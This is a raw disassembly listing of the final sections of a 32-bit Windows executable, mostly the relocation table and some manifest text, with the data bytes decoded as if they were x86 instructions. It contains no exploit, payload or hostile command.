  4307b2:	and    BYTE PTR [ebp+0x69],dh
  4307b5:	inc    ecx
  4307b6:	arpl   WORD PTR [ebx+0x65],sp
  4307b9:	jae    0x43082e
  4307bb:	cmp    eax,0x6c616622
  4307c0:	jae    0x430827
  4307c2:	and    bh,BYTE PTR [esi]
  4307c4:	cmp    al,0x2f
  4307c6:	jb     0x43082d
  4307c8:	jno    0x43083f
  4307ca:	gs jae 0x430841
  4307cd:	gs fs inc ebp
  4307d0:	js     0x430837
  4307d2:	arpl   WORD PTR [ebp+0x74],si
  4307d5:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4307dc:	ins    BYTE PTR es:[edi],dx
  4307dd:	ds cmp al,0x2f
  4307e0:	jb     0x430847
  4307e2:	jno    0x430859
  4307e4:	gs jae 0x43085b
  4307e7:	gs fs push eax
  4307ea:	jb     0x430855
  4307ec:	jbe    0x430857
  4307ee:	ins    BYTE PTR es:[edi],dx
  4307ef:	gs addr16 gs jae 0x430832
  4307f4:	cmp    al,0x2f
  4307f6:	jae    0x43085d
  4307f8:	arpl   WORD PTR [ebp+0x72],si
  4307fb:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x72742f3c
  430803:	jne    0x430878
  430805:	je     0x430850
  430807:	outs   dx,BYTE PTR ds:[esi]
  430808:	outs   dx,WORD PTR ds:[esi]
  43080a:	ds cmp al,0x2f
  43080d:	popa   
  43080e:	jae    0x430883
  430810:	gs ins DWORD PTR es:[edi],dx
  430812:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  430816:	push   eax
  430817:	inc    ecx

Disassembly of section .reloc:

00431000 <.reloc>:
  431000:	add    BYTE PTR [eax],dl
  431002:	add    BYTE PTR [eax],al
  431004:	xchg   esp,eax
  431005:	add    DWORD PTR [eax],eax
  431007:	add    BYTE PTR [ecx],cl
  431009:	xor    BYTE PTR [eax+esi*1],dl
  43100c:	and    BYTE PTR [eax],dh
  43100e:	inc    esp
  43100f:	xor    BYTE PTR [edx+0x30],cl
  431012:	pop    esi
  431013:	xor    BYTE PTR [eax+esi*1+0x76],ch
  431017:	xor    BYTE PTR [edx-0x30cf45d0],ah
  43101d:	xor    cl,ch
  43101f:	xor    al,bh
  431021:	xor    BYTE PTR ds:0x4d313731,cl
  431027:	xor    DWORD PTR [ebx+0x31],edx
  43102a:	js     0x43105d
  43102c:	jge    0x43105f
  43102e:	test   BYTE PTR [ecx],dh
  431030:	mov    al,ds:0xad31a731
  431035:	xor    DWORD PTR [edi-0x33ce3ccf],esi
  43103b:	xor    edx,edx
  43103d:	xor    edi,edx
  43103f:	xor    esi,ebx
  431041:	xor    DWORD PTR [edx+esi*1],ecx
  431044:	adc    DWORD PTR [edx],esi
  431046:	and    BYTE PTR [edx],dh
  431048:	daa    
  431049:	xor    ch,BYTE PTR [edx+esi*1]
  43104c:	data16 xor ch,BYTE PTR [ebx+0x32]
  431050:	jno    0x431084
  431052:	xchg   esp,eax
  431053:	xor    ah,BYTE PTR [ebx-0x5cd50ce]
  431059:	xor    dl,BYTE PTR [eax]
  43105b:	xor    esp,DWORD PTR ds:0xbe337533
  431061:	xor    eax,esp
  431063:	xor    edx,ecx
  431065:	xor    edi,ecx
  431067:	xor    edi,edi
  431069:	xor    eax,DWORD PTR [esi]
  43106b:	xor    al,0x39
  43106d:	xor    al,0x43
  43106f:	xor    al,0x52
  431071:	xor    al,0x58
  431073:	xor    al,0x6e
  431075:	xor    al,0x74
  431077:	xor    al,0x95
  431079:	xor    al,0x9b
  43107b:	xor    al,0xe9
  43107d:	xor    al,0xef
  43107f:	xor    al,0xfc
  431081:	xor    al,0x21
  431083:	xor    eax,0x352d3527
  431088:	xor    esi,DWORD PTR ds:0x354e3549
  43108e:	arpl   WORD PTR ds:0x35833573,si
  431094:	xchg   ecx,eax
  431095:	xor    eax,0x35bf359b
  43109a:	shl    DWORD PTR ds:0x35e635da,1
  4310a0:	cld    
  4310a1:	xor    eax,0x3611360b
  4310a6:	pop    ds
  4310a7:	ss and eax,0x38362d36
  4310ad:	ss inc ebx
  4310af:	ss pop ebx
  4310b1:	ss pusha 
  4310b3:	outs   dx,BYTE PTR ss:[esi]
  4310b5:	ss jl  0x4310ee
  4310b8:	mov    DWORD PTR [esi],esi
  4310ba:	xchg   esp,eax
  4310bb:	lods   al,BYTE PTR ss:[esi]
  4310bd:	ss mov cl,0x36
  4310c0:	mov    edi,0xdf36cd36
  4310c5:	ss call 0xfb7a0101
  4310cb:	adc    esi,DWORD PTR ss:[edi]
  4310ce:	sbb    BYTE PTR [edi],dh
  4310d0:	es aaa 
  4310d2:	xor    al,0x37
  4310d4:	inc    ecx
  4310d5:	aaa    
  4310d6:	dec    esp
  4310d7:	aaa    
  4310d8:	popa   
  4310d9:	aaa    
  4310da:	data16 aaa 
  4310dc:	je     0x431115
  4310de:	xor    BYTE PTR [edi],0x8f
  4310e1:	aaa    
  4310e2:	call   0xc337:0xb437af37
  4310e9:	aaa    
  4310ea:	into   
  4310eb:	aaa    
  4310ec:	jecxz  0x431125
  4310ee:	call   0x77b0a2a
  4310f3:	cmp    BYTE PTR [eax+edi*1],dl
  4310f6:	pop    ds
  4310f7:	cmp    BYTE PTR [eax+edi*1],dh
  4310fa:	cmp    DWORD PTR [eax],edi
  4310fc:	dec    edx
  4310fd:	cmp    BYTE PTR [eax+0x38],bl
  431100:	cmp    BYTE PTR gs:[eax+0x38],dh
  431104:	mov    BYTE PTR [eax],bh
  431106:	lea    edi,[eax]
  431108:	fwait
  431109:	cmp    BYTE PTR [ecx-0x2ac72fc8],ch
  43110f:	cmp    bl,bl
  431111:	cmp    BYTE PTR ds:0x2b390c39,al
  431117:	cmp    DWORD PTR [ebx],esi
  431119:	cmp    DWORD PTR [ecx],edi
  43111b:	cmp    DWORD PTR [edi],edi
  43111d:	cmp    DWORD PTR [eax+0x39],edx
  431120:	push   esi
  431121:	cmp    DWORD PTR [ebp+0x39],ebp
  431124:	js     0x43115f
  431126:	fwait
  431127:	cmp    DWORD PTR [esi-0x10c631c7],esp
  43112d:	cmp    ebp,edi
  43112f:	cmp    DWORD PTR [eax],esp
  431131:	cmp    dl,BYTE PTR [ebp+0x3a]
  431134:	push   0x753a6d3a
  431139:	cmp    al,BYTE PTR [edi-0x54c570c6]
  43113f:	cmp    dh,BYTE PTR [eax-0x1dc53bc6]
  431145:	cmp    ah,bh
  431147:	cmp    bh,bl
  431149:	cmp    al,BYTE PTR [edx-0x4fc45ac5]
  43114f:	cmp    esi,ecx
  431151:	cmp    edx,DWORD PTR ds:0x683c423c
  431157:	cmp    al,0x73
  431159:	cmp    al,0x86
  43115b:	cmp    al,0x9c
  43115d:	cmp    al,0xac
  43115f:	cmp    al,0xb2
  431161:	cmp    al,0xbb
  431163:	cmp    al,0xc7
  431165:	cmp    al,0xcf
  431167:	cmp    al,0xdc
  431169:	cmp    al,0xe9
  43116b:	cmp    al,0xf0
  43116d:	cmp    al,0x13
  43116f:	cmp    eax,0x3d9c3d4a
  431174:	mov    dh,0x3d
  431176:	jmp    0x478144b8
  43117b:	ds jge 0x4311bc
  43117e:	mov    ds:0xc83eb63e,al
  431183:	ds iret 
  431185:	ds aad 0x3e
  431188:	out    0x3e,eax
  43118a:	out    dx,eax
  43118b:	ds cli 
  43118d:	ds dec edi
  43118f:	aas    
  431190:	pop    ecx
  431191:	aas    
  431192:	test   al,0x3f
  431194:	add    BYTE PTR [eax],ah
  431196:	add    BYTE PTR [eax],al
  431198:	add    al,0x1
  43119a:	add    BYTE PTR [eax],al
  43119c:	xor    dh,BYTE PTR [eax]
  43119e:	cmp    BYTE PTR [eax],dh
  4311a0:	xor    BYTE PTR ds:[eax+esi*1+0x4a],al
  4311a5:	xor    BYTE PTR [eax+0x30],dl
  4311a8:	push   edi
  4311a9:	xor    BYTE PTR [esi+0x30],bl
  4311ac:	xor    BYTE PTR gs:[eax+esi*1+0x73],ch
  4311b1:	xor    BYTE PTR [edx+0x30],bh
  4311b4:	xor    DWORD PTR [eax],0x30913089
  4311ba:	cdq    
  4311bb:	xor    BYTE PTR [ebp-0x4ccf51d0],ah
  4311c1:	xor    BYTE PTR [ecx-0x33cf3cd0],bh
  4311c7:	xor    bh,dl
  4311c9:	xor    bl,ah
  4311cb:	xor    al,ch
  4311cd:	xor    al,bh
  4311cf:	xor    ch,bh
  4311d1:	xor    BYTE PTR [ebx],al
  4311d3:	xor    DWORD PTR [ecx],ecx
  4311d5:	xor    DWORD PTR [edi],ebx
  4311d7:	xor    DWORD PTR [esi],esp
  4311d9:	xor    DWORD PTR [eax],esi
  4311db:	xor    dh,BYTE PTR [edi]
  4311dd:	xor    bh,BYTE PTR [edx-0x28cd3dce]
  4311e3:	xor    ah,dl
  4311e5:	xor    ah,BYTE PTR [eax]
  4311e7:	xor    esi,DWORD PTR [edx]
  4311e9:	xor    eax,DWORD PTR [esp+esi*1]
  4311ec:	push   cs
  4311ed:	xor    al,0x1b
  4311ef:	xor    al,0x36
  4311f1:	xor    al,0x3d
  4311f3:	xor    al,0x55
  4311f5:	xor    al,0x81
  4311f7:	xor    al,0x9d
  4311f9:	xor    al,0xc0
  4311fb:	xor    al,0xd3
  4311fd:	xor    al,0x49
  4311ff:	test   DWORD PTR ss:[esi],esi
  431202:	xchg   edi,eax
  431203:	ss out 0x36,al
  431206:	in     al,dx
  431207:	ss std 
  431209:	ss repnz aaa 
  43120c:	sti    
  43120d:	aaa    
  43120e:	pop    es
  43120f:	cmp    BYTE PTR [esi],bh
  431211:	cmp    BYTE PTR [edi+0x38],al
  431214:	push   ebx
  431215:	cmp    BYTE PTR [eax+edi*1+0x38a13895],cl
  43121c:	cli    
  43121d:	cmp    BYTE PTR [eax],al
  43121f:	cmp    DWORD PTR ds:0x4b391e39,edx
  431225:	cmp    DWORD PTR [esi+0x39],esp
  431228:	ins    BYTE PTR es:[edi],dx
  431229:	cmp    DWORD PTR [ebp+0x39],esi
  43122c:	jl     0x431267
  43122e:	sahf   
  43122f:	cmp    ebp,edi
  431231:	cmp    DWORD PTR ds:0x233a183a,eax
  431237:	cmp    ch,BYTE PTR [eax]
  431239:	cmp    bh,BYTE PTR [eax]
  43123b:	cmp    al,BYTE PTR [edx+0x3a]
  43123e:	dec    ecx
  43123f:	cmp    dl,BYTE PTR [edx+edi*1+0x5d]
  431243:	cmp    dh,BYTE PTR [ebx+0x3a]
  431246:	jle    0x431282
  431248:	cwde   
  431249:	cmp    ah,BYTE PTR [edx+edi*1+0x3abc3aac]
  431250:	sar    DWORD PTR [edx],1
  431252:	adc    DWORD PTR [ebx],edi
  431254:	push   ds
  431255:	cmp    ecx,DWORD PTR [eax+0x3b]
  431258:	dec    ebp
  431259:	cmp    ebx,DWORD PTR [eax+0x3b]
  43125c:	pop    ebp
  43125d:	cmp    edi,DWORD PTR [ebx+0x3b]
  431260:	sub    al,0x3c
  431262:	cmp    DWORD PTR [esi+edx*2],edi
  431265:	cmp    al,0x8d
  431267:	cmp    al,0xa5
  431269:	cmp    al,0xb0
  43126b:	cmp    al,0xd4
  43126d:	cmp    al,0xdd
  43126f:	cmp    al,0xe4
  431271:	cmp    al,0xed
  431273:	cmp    al,0x2d
  431275:	cmp    eax,0x3d5a3d32
  43127a:	jg     0x4312b9
  43127c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43127d:	cmp    eax,0x3dcf3db7
  431282:	loope  0x4312c1
  431284:	add    eax,0xb83e3f3e
  431289:	ds mov esi,0xdd3ed73e
  43128f:	test   DWORD PTR ds:[edi],edi
  431292:	nop
  431293:	aas    
  431294:	iret   
  431295:	aas    
  431296:	add    BYTE PTR [eax],al
  431298:	add    BYTE PTR [eax],dh
  43129a:	add    BYTE PTR [eax],al
  43129c:	cmp    al,0x1
  43129e:	add    BYTE PTR [eax],al
  4312a0:	or     al,0x30
  4312a2:	sbb    esi,DWORD PTR [eax]
  4312a4:	ins    DWORD PTR es:[edi],dx
  4312a5:	xor    BYTE PTR [eax+0x30],bh
  4312a8:	xor    BYTE PTR [eax],0x93
  4312ab:	xor    BYTE PTR [esi+0x15320930],bl
  4312b1:	xor    bl,BYTE PTR [ebx]
  4312b3:	xor    ah,BYTE PTR [eax]
  4312b5:	xor    ah,BYTE PTR [esi]
  4312b7:	xor    dl,BYTE PTR [eax-0x53cd68ce]
  4312bd:	xor    ah,bh
  4312bf:	xor    al,BYTE PTR [eax]
  4312c1:	xor    eax,DWORD PTR [edi]
  4312c3:	xor    ebx,DWORD PTR [ebx]
  4312c5:	xor    edi,DWORD PTR [ebx+esi*1]
  4312c8:	inc    edx
  4312c9:	xor    esi,DWORD PTR [ebx+esi*1-0x35]
  4312cd:	xor    edx,ebx
  4312cf:	xor    edx,DWORD PTR [ebx]
  4312d1:	xor    al,0x1d
  4312d3:	xor    al,0x45
  4312d5:	xor    al,0x5e
  4312d7:	xor    al,0x9f
  4312d9:	xor    al,0xcf
  4312db:	xor    al,0xe1
  4312dd:	xor    al,0x33
  4312df:	xor    eax,0x355c3539
  4312e4:	popa   
  4312e5:	xor    eax,0x35873582
  4312ea:	lods   al,BYTE PTR ds:[esi]
  4312eb:	xor    eax,0x35bd35b2
  4312f0:	leave  
  4312f1:	xor    eax,0x35e535de
  4312f6:	stc    
  4312f7:	xor    eax,0x36273600
  4312fc:	sub    eax,0x44363836
  431301:	ss pop ecx
  431303:	ss pusha 
  431305:	ss je  0x43133e
  431308:	jnp    0x431340
  43130a:	xchg   ebx,eax
  43130b:	ss lahf 
  43130d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  43130f:	ss mov cl,0x36
  431312:	shl    BYTE PTR [esi],0xc6
  431315:	ss iret 
  431317:	(bad)  ss:[esi]
  43131a:	jmp    0xfb7a0255
  43131f:	add    DWORD PTR ss:[edi],esi
  431322:	push   cs
  431323:	aaa    
  431324:	sbb    BYTE PTR [edi],dh
  431326:	pop    ds
  431327:	aaa    
  431328:	aaa    
  431329:	aaa    
  43132a:	inc    esi
  43132b:	aaa    
  43132c:	dec    ebp
  43132d:	aaa    
  43132e:	pop    edx
  43132f:	aaa    
  431330:	jge    0x431369
  431332:	xchg   edx,eax
  431333:	aaa    
  431334:	mov    eax,0xfe37f837
  431339:	aaa    
  43133a:	sub    BYTE PTR [eax],bh
  43133c:	cmp    BYTE PTR cs:[edx+0x38],cl
  431340:	bound  edi,QWORD PTR [eax]
  431342:	mov    BYTE PTR [eax],bh
  431344:	add    bh,BYTE PTR [ecx]
  431346:	and    eax,0x67392f39
  43134b:	cmp    DWORD PTR [edi+0x39],ebp
  43134e:	mov    ecx,0xdb39c039
  431353:	cmp    eax,esp
  431355:	cmp    eax,ebp
  431357:	cmp    esi,ebp
  431359:	cmp    ebp,esi
  43135b:	cmp    ebx,edi
  43135d:	cmp    DWORD PTR [edx],eax
  43135f:	cmp    cl,BYTE PTR [eax]
  431361:	cmp    dl,BYTE PTR [eax]
  431363:	cmp    dl,BYTE PTR [edi]
  431365:	cmp    bl,BYTE PTR [edx+edi*1]
  431368:	and    al,0x3a
  43136a:	sub    eax,0x3e3a393a
  43136f:	cmp    al,BYTE PTR [ebx+0x3a]
  431372:	dec    ecx
  431373:	cmp    cl,BYTE PTR [ebp+0x3a]
  431376:	push   ebx
  431377:	cmp    bl,BYTE PTR [eax+0x3a]
  43137a:	pop    esi
  43137b:	cmp    ah,BYTE PTR [ebx+0x3a]
  43137e:	jb     0x4313ba
  431380:	mov    BYTE PTR [edx],bh
  431382:	xchg   ebx,eax
  431383:	cmp    bl,BYTE PTR [eax-0x57c55cc6]
  431389:	cmp    dh,BYTE PTR [ebx-0x3ac547c6]
  43138f:	cmp    dl,bl
  431391:	cmp    bl,cl
  431393:	cmp    ah,dh
  431395:	cmp    al,BYTE PTR [esi]
  431397:	cmp    ecx,DWORD PTR [ebx+edi*1]
  43139a:	sub    BYTE PTR [ebx],bh
  43139c:	pop    eax
  43139d:	cmp    ebx,DWORD PTR [ebp+0x3b]
  4313a0:	imul   edi,DWORD PTR [ebx],0x75
  4313a3:	cmp    edx,DWORD PTR [edx-0x43c41dc5]
  4313a9:	cmp    al,0xc4
  4313ab:	cmp    al,0xdc
  4313ad:	cmp    al,0xf4
  4313af:	cmp    al,0x4b
  4313b1:	cmp    eax,0x3d883d65
  4313b6:	xchg   ebp,eax
  4313b7:	cmp    eax,0x3da93da1
  4313bc:	mov    cl,0x3d
  4313be:	mov    ebp,0xe93de13d
  4313c3:	cmp    eax,0x3e3e3df4
  4313c8:	dec    ebx
  4313c9:	ds fs cmp BYTE PTR ds:[esi],0xc0
  4313cf:	ds out dx,eax
  4313d1:	ds test al,0x3f
  4313d4:	add    BYTE PTR [eax+0x0],al
  4313d7:	add    BYTE PTR [eax+eax*1+0x300d0000],dl
  4313de:	shl    DWORD PTR [eax],0xe1
  4313e1:	xor    cl,dl
  4313e3:	xor    edx,edi
  4313e5:	xor    DWORD PTR [ebx+0x32],edx
  4313e8:	loope  0x43141d
  4313ea:	shl    DWORD PTR [edx+ecx*4],0x35
  4313ee:	mov    ebx,0x1235d135
  4313f3:	xor    DWORD PTR ss:[esi],esi
  4313f6:	into   
  4313f7:	add    dh,BYTE PTR ss:[edi]
  4313fa:	xor    DWORD PTR [edi],esi
  4313fc:	scas   al,BYTE PTR es:[edi]
  4313fd:	aaa    
  4313fe:	adc    eax,0x55384238
  431403:	cmp    BYTE PTR [ebx+0x38],bl
  431406:	jne    0x431440
  431408:	test   BYTE PTR [eax],bh
  43140a:	xchg   ecx,eax
  43140b:	cmp    BYTE PTR [ebp-0x4bc752c8],bl
  431411:	cmp    bl,al
  431413:	cmp    bh,cl
  431415:	cmp    ah,bl
  431417:	cmp    BYTE PTR [eax],al
  431419:	cmp    DWORD PTR [edx],edx
  43141b:	cmp    DWORD PTR [eax],esp
  43141d:	cmp    DWORD PTR ds:0x65393f39,esi
  431423:	cmp    DWORD PTR [eax-0x4fc658c7],ebx
  431429:	cmp    esp,edx
  43142b:	cmp    DWORD PTR [ebx],eax
  43142d:	cmp    bl,BYTE PTR [ebp-0xec525c6]
  431433:	cmp    ah,BYTE PTR [esp+edi*1+0x75]
  431437:	cmp    al,0xaf
  431439:	cmp    al,0xbc
  43143b:	cmp    al,0xc6
  43143d:	cmp    al,0xd4
  43143f:	cmp    al,0xdd
  431441:	cmp    al,0xe7
  431443:	cmp    al,0x1b
  431445:	cmp    eax,0x3d303d26
  43144a:	dec    ecx
  43144b:	cmp    eax,0x3d663d53
  431450:	mov    bh,BYTE PTR ds:0x3df63dc1
  431456:	or     DWORD PTR [esi],edi
  431458:	jns    0x431498
  43145a:	xchg   esi,eax
  43145b:	fidivr WORD PTR ds:[esi]
  43145e:	dec    edx
  43145f:	aas    
  431460:	ins    BYTE PTR es:[edi],dx
  431461:	aas    
  431462:	loope  0x4314a3
  431464:	in     eax,dx
  431465:	aas    
  431466:	add    BYTE PTR [eax],al
  431468:	add    BYTE PTR [eax+0x0],dl
  43146b:	add    BYTE PTR [eax+0x0],ah
  43146e:	add    BYTE PTR [eax],al
  431470:	add    BYTE PTR [eax],dh
  431472:	adc    dh,BYTE PTR [eax]
  431474:	sub    eax,0x3d303530
  431479:	xor    BYTE PTR [eax+esi*1+0x6d],dl
  43147d:	xor    BYTE PTR [ecx-0x67cf6dd0],cl
  431483:	xor    BYTE PTR [ecx-0x4acf59d0],ah
  431489:	xor    ah,bl
  43148b:	xor    BYTE PTR ds:0x39311631,al
  431491:	xor    esi,edi
  431493:	xor    DWORD PTR [eax],ebp
  431495:	xor    dh,BYTE PTR [ebx+0x32]
  431498:	mov    edi,0x56330e32
  43149d:	xor    edi,DWORD PTR [ebx+esi*1+0x33e433d3]
  4314a4:	and    BYTE PTR [edi+ecx*2],dh
  4314a7:	xor    al,0x70
  4314a9:	xor    al,0x92
  4314ab:	xor    al,0xdb
  4314ad:	xor    al,0x24
  4314af:	xor    eax,0x35ef35d5
  4314b4:	cli    
  4314b5:	xor    eax,0x37a43736
  4314ba:	loopne 0x4314f4
  4314bc:	out    dx,al
  4314bd:	cmp    edx,ebp
  4314bf:	cmp    al,BYTE PTR [edx]
  4314c1:	cmp    esp,DWORD PTR [esi]
  4314c3:	cmp    esi,DWORD PTR [esi]
  4314c5:	ds jp  0x431507
  4314c8:	add    BYTE PTR [eax+0x0],ah
  4314cb:	add    BYTE PTR [eax+eax*1+0x30fd0000],bl
  4314d2:	sub    eax,0x3b315331
  4314d7:	xor    esp,DWORD PTR [edx+0x35]
  4314da:	xor    ax,0x356a
  4314de:	outs   dx,BYTE PTR ds:[esi]
  4314df:	xor    eax,0x35763572
  4314e4:	jp     0x43151b
  4314e6:	jle    0x43151d
  4314e8:	mov    DWORD PTR ds:0x359a3590,esi
  4314ee:	les    esi,FWORD PTR ds:0x35d835d2
  4314f4:	sti    
  4314f5:	xor    eax,0x361b3602
  4314fa:	das    
  4314fb:	ss xor eax,0x51363e36
  431501:	ss jne 0x43153a
  431504:	or     dh,BYTE PTR [edi]
  431506:	sub    dh,BYTE PTR [edi]
  431508:	cmp    BYTE PTR [edi],dh
  43150a:	cmp    eax,0x8e398037
  43150f:	cmp    DWORD PTR [ecx+edi*1+0x39b339ae],edx
  431516:	ret    0xcb39
  431519:	cmp    eax,ebx
  43151b:	cmp    ebx,esp
  43151d:	cmp    ebp,esi
  43151f:	cmp    DWORD PTR [eax],ecx
  431521:	cmp    dl,BYTE PTR [ebx]
  431523:	cmp    bl,BYTE PTR [ecx]
  431525:	cmp    bl,BYTE PTR [edi]
  431527:	cmp    ah,BYTE PTR [edx+edi*1]
  43152a:	sub    eax,0x503a4a3a
  43152f:	cmp    bl,BYTE PTR [ebx+0x3a]
  431532:	pusha  
  431533:	cmp    ch,BYTE PTR [eax+0x3a]
  431536:	outs   dx,BYTE PTR ds:[esi]
  431537:	cmp    bh,BYTE PTR [eax+0x3a]
  43153a:	jg     0x431576
  43153c:	xchg   ebx,eax
  43153d:	cmp    bl,BYTE PTR [edx-0x51c55fc6]
  431543:	cmp    dh,BYTE PTR [ebp-0x3cc545c6]
  431549:	cmp    dl,al
  43154b:	cmp    dl,dh
  43154d:	cmp    dh,al
  43154f:	cmp    al,BYTE PTR [ecx]
  431551:	cmp    eax,DWORD PTR [edi]
  431553:	cmp    ebx,DWORD PTR [eax]
  431555:	cmp    edi,DWORD PTR [ebp+0x3b]
  431558:	sbb    al,0x3f
  43155a:	sub    BYTE PTR [edi],bh
  43155c:	pop    ebx
  43155d:	aas    
  43155e:	cmp    DWORD PTR [edi],0x3fbb
  431564:	add    BYTE PTR [eax+0x0],dh
  431567:	add    al,cl
  431569:	add    BYTE PTR [eax],al
  43156b:	add    BYTE PTR [eax],al
  43156d:	xor    bl,dl
  43156f:	xor    esi,ebx
  431571:	xor    esi,esp
  431573:	xor    DWORD PTR [edx+esi*1],edi
  431576:	jns    0x4315aa
  431578:	fdiv   QWORD PTR [edx]
  43157a:	out    dx,al
  43157b:	xor    bh,BYTE PTR [esi]
  43157d:	xor    eax,DWORD PTR [ebx+esi*1+0x64]
  431581:	xor    ebx,DWORD PTR [ebx-0xacc53cd]
  431587:	xor    edx,DWORD PTR [ecx+0x34]
  43158a:	data16 xor al,0xac
  43158d:	xor    al,0xb2
  43158f:	xor    al,0xbe
  431591:	xor    al,0x13
  431593:	xor    eax,0x357e3546
  431598:	jmp    0x407904d2
  43159d:	ss inc esi
  43159f:	ss push 0x36
  4315a2:	lea    esi,[esi]
  4315a4:	shl    DWORD PTR [esi],0xc7
  4315a7:	shl    DWORD PTR ss:[esi],cl
  4315aa:	sbb    dh,BYTE PTR [edi]
  4315ac:	cs aaa 
  4315ae:	gs aaa 
  4315b0:	jo     0x4315e9
  4315b2:	xor    BYTE PTR [edi],0x8b
  4315b5:	aaa    
  4315b6:	add    eax,0x47381e38
  4315bb:	cmp    BYTE PTR [eax+edi*1+0x63],cl
  4315bf:	cmp    BYTE PTR [eax+0x39],bl
  4315c2:	pop    ebp
  4315c3:	cmp    DWORD PTR [edi+0x39],ebp
  4315c6:	lea    edi,[ecx]
  4315c8:	mov    eax,ds:0x1639a739
  4315cd:	cmp    bl,BYTE PTR [ebx]
  4315cf:	cmp    ah,BYTE PTR [eax]
  4315d1:	cmp    ah,BYTE PTR ds:0x643a353a
  4315d7:	cmp    dh,BYTE PTR [edx+0x3a]
  4315da:	mov    ecx,0x33abe3a
  4315df:	cmp    ecx,DWORD PTR [eax]
  4315e1:	cmp    ecx,DWORD PTR [edi]
  4315e3:	cmp    edx,DWORD PTR [ebx+edi*1]
  4315e6:	sbb    edi,DWORD PTR [ebx]
  4315e8:	and    BYTE PTR [ebx],bh
  4315ea:	(bad)  
  4315eb:	cmp    ebx,DWORD PTR [eax+0x283b9e3b]
  4315f1:	cmp    al,0x37
  4315f3:	cmp    al,0x46
  4315f5:	cmp    al,0x4f
  4315f7:	cmp    al,0x64
  4315f9:	cmp    al,0x94
  4315fb:	cmp    al,0xb5
  4315fd:	cmp    al,0xc2
  4315ff:	cmp    al,0xf9
  431601:	cmp    al,0x7
  431603:	cmp    eax,0x3d1d3d0d
  431608:	and    bh,BYTE PTR ds:0x3d403d3a
  43160e:	dec    edi
  43160f:	cmp    eax,0x3d643d55
  431614:	push   0x3d
  431616:	js     0x431655
  431618:	cmp    DWORD PTR ds:0x3d953d90,0x3dad3d9f
  431622:	in     eax,dx
  431623:	cmp    eax,0x3e273e0a
  431628:	stc    
  431629:	aas    
  43162a:	add    BYTE PTR [eax],al
  43162c:	add    BYTE PTR [eax+0xec0000],al
  431632:	add    BYTE PTR [eax],al
  431634:	add    BYTE PTR [eax],dh
  431636:	push   es
  431637:	xor    dl,ch
  431639:	xor    BYTE PTR [edi],bl
  43163b:	xor    DWORD PTR [eax],edi
  43163d:	xor    DWORD PTR [edi],edi
  43163f:	xor    DWORD PTR [edi+0x31],eax
  431642:	dec    esp
  431643:	xor    DWORD PTR [eax+0x31],edx
  431646:	push   esp
  431647:	xor    DWORD PTR [ebp+0x31],edi
  43164a:	mov    ds:0xc831c131,eax
  43164f:	xor    esp,ecx
  431651:	xor    eax,edx
  431653:	xor    esp,edx
  431655:	xor    eax,ebx
  431657:	xor    esp,ebx
  431659:	xor    eax,esp
  43165b:	xor    esp,esp
  43165d:	xor    DWORD PTR [esi],ebp
  43165f:	xor    dh,BYTE PTR [edx+esi*1]
  431662:	cmp    BYTE PTR [edx],dh
  431664:	cmp    al,0x32
  431666:	inc    eax
  431667:	xor    ah,BYTE PTR [esi-0x33cd4ece]
  43166d:	xor    dl,bl
  43166f:	xor    bl,al
  431671:	xor    bl,ah
  431673:	xor    ah,al
  431675:	xor    al,BYTE PTR [ecx]
  431677:	xor    ebp,DWORD PTR [ebx]
  431679:	xor    ebx,DWORD PTR [ebp+0x33]
  43167c:	xor    ebp,DWORD PTR fs:[eax+0x33]
  431680:	ins    BYTE PTR es:[edi],dx
  431681:	xor    esi,DWORD PTR [eax+0x33]
  431684:	je     0x4316b9
  431686:	js     0x4316bb
  431688:	jl     0x4316bd
  43168a:	xor    BYTE PTR [ebx],0xca
  43168d:	xor    edx,eax
  43168f:	xor    edx,esp
  431691:	xor    ebx,eax
  431693:	xor    ebx,esp
  431695:	xor    edi,DWORD PTR ds:0x55344934
  43169b:	xor    eax,0x359e358e
  4316a0:	mov    ecx,0x2f35d935
  4316a5:	ss inc eax
  4316a7:	ss jnp 0x4316e0
  4316aa:	xchg   edi,eax
  4316ab:	ss repnz ss std 
  4316af:	sub    esi,DWORD PTR ss:[edi]
  4316b2:	cmp    DWORD PTR [edi],esi
  4316b4:	dec    eax
  4316b5:	aaa    
  4316b6:	push   esi
  4316b7:	aaa    
  4316b8:	pop    esi
  4316b9:	aaa    
  4316ba:	imul   esi,DWORD PTR [edi],0xffffff89
  4316bd:	aaa    
  4316be:	xchg   ebx,eax
  4316bf:	aaa    
  4316c0:	pushf  
  4316c1:	aaa    
  4316c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4316c3:	aaa    
  4316c4:	mov    esp,0xc937c337
  4316c9:	aaa    
  4316ca:	fbstp  TBYTE PTR [edi]
  4316cc:	cli    
  4316cd:	aaa    
  4316ce:	cmp    BYTE PTR ds:[edi+0x38],bl
  4316d2:	imul   edi,DWORD PTR [eax],0xffffff92
  4316d5:	cmp    BYTE PTR [edi-0x4dc75bc8],bl
  4316db:	cmp    BYTE PTR [ebp-0x44c64fc7],cl
  4316e1:	cmp    esi,ebx
  4316e3:	cmp    DWORD PTR ds:0xa83a963a,ebp
  4316e9:	cmp    dh,BYTE PTR [ebp-0x34c53ec6]
  4316ef:	cmp    dl,bl
  4316f1:	cmp    bl,dh
  4316f3:	cmp    cl,BYTE PTR [esi]
  4316f5:	cmp    edi,DWORD PTR [esi]
  4316f7:	cmp    edx,ebp
  4316f9:	cmp    eax,DWORD PTR [ebp+0x263ca83c]
  4316ff:	cmp    eax,0x3e7f3df7
  431704:	mov    DWORD PTR [esi],edi
  431706:	mov    eax,ds:0xb23ea83e
  43170b:	ds mov edx,0xce3ec73e
  431711:	ds (bad) 
  431713:	ds xchg edi,eax
  431715:	aas    
  431716:	add    BYTE PTR [eax],al
  431718:	add    BYTE PTR [eax+0xa40000],dl
  43171e:	add    BYTE PTR [eax],al
  431720:	or     al,0x30
  431722:	sbb    DWORD PTR [edx],esi
  431724:	sub    esi,DWORD PTR [edx]
  431726:	cmp    eax,0x71325f32
  43172b:	xor    al,BYTE PTR [ebx-0x58cd6ace]
  431731:	xor    bh,BYTE PTR [ecx+0xa32cb32]
  431737:	xor    eax,0x36953511
  43173c:	mov    bl,0x36
  43173e:	out    dx,eax
  43173f:	aaa    
  431740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
